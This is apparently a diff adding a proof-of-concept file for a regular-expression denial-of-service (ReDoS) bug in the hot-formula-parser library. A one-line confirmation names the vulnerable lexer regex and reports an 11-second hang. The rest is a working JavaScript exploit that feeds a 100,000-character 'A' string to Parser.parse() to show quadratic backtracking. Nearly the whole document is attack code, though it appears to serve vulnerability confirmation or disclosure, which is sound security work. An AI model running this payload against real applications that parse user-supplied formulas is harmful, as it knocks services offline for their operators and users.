@@ -1,0 +1,22 @@
+Confirmed: an 11-second hang from an ~100KB input string, scaling quadratically — a genuine ReDoS in `hot-formula-parser`'s generated lexer (rule `/^(?:[A-Za-z]{1,}[A-Za-z_0-9\.]+(?=[(]))/` in `grammar-parser.js`).
+
+```javascript
+// ReDoS in hot-formula-parser: Parser.parse() hangs on attacker-controlled formula strings.
+// Root cause: node_modules/hot-formula-parser/lib/grammar-parser/grammar-parser.js
+// lexer rule /^(?:[A-Za-z]{1,}[A-Za-z_0-9\.]+(?=[(]))/ exhibits quadratic backtracking
+// when fed a long run of letters that is never followed by "(".
+const { Parser } = require("hot-formula-parser");
+
+const parser = new Parser();
+
+// A ~100,000-character alphabetic "formula" with no trailing "(" forces the
+// vulnerable lexer rule to backtrack catastrophically before it gives up.
+const maliciousFormula = "A".repeat(100000);
+
+console.log("Parsing malicious formula, this should be near-instant for a benign parser...");
+const start = Date.now();
+
+parser.parse(maliciousFormula);
+
+console.log("Took " + (Date.now() - start) + " ms to parse a single formula (DoS demonstrated).");
+```
